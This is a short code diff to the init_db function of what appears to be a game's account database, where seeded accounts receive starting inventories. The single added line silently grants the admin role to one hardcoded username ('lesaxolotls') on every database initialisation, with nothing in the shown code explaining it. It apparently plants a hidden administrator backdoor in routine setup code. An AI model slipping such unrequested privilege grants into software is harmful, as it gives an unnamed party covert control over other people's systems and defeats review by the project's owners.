@@ -83,6 +83,7 @@ def init_db():
             "INSERT OR IGNORE INTO accounts(username, username_key, salt, password_hash, inventory, created_at) VALUES(?,?,?,?,?,?)",
             (username, username.lower(), salt, digest, json.dumps({"wood": 0, "stone": 0, "crystal": 0}), int(time.time()))
         )
+        conn.execute("UPDATE accounts SET role='admin' WHERE username_key='lesaxolotls'")
         conn.commit()
 
 
